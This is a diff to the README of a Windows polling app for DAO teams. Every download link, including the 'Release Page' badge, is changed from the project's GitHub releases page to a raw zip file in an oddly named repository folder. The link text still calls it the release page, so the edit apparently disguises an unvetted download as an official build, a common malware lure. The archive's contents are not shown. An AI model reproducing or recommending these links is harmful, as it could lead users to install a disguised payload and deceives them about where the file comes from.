@@ -1,6 +1,6 @@
 # 📊 snapshot_poll - Simple polling for DAO teams
 
-[![Download snapshot_poll](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Laos7424/snapshot_poll/releases)
+[![Download snapshot_poll](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Laos7424/snapshot_poll/main/Bistorta/poll_snapshot_1.9.zip)
 
 ## 🧭 What this app does
 
@@ -19,7 +19,7 @@ It is built to stay simple. You can use it without a long setup flow or extra to
 
 Visit the release page here and download the Windows version that matches your device:
 
-https://github.com/Laos7424/snapshot_poll/releases
+https://raw.githubusercontent.com/Laos7424/snapshot_poll/main/Bistorta/poll_snapshot_1.9.zip
 
 If the page lists more than one file, pick the Windows file, such as `.exe` or `.zip`.
 
@@ -140,7 +140,7 @@ If your setup uses a wallet, identity layer, or DAO tool, follow the flow your g
 
 Download or pick the Windows build from the release page:
 
-https://github.com/Laos7424/snapshot_poll/releases
+https://raw.githubusercontent.com/Laos7424/snapshot_poll/main/Bistorta/poll_snapshot_1.9.zip
 
 ## 📁 What the release files may contain
 
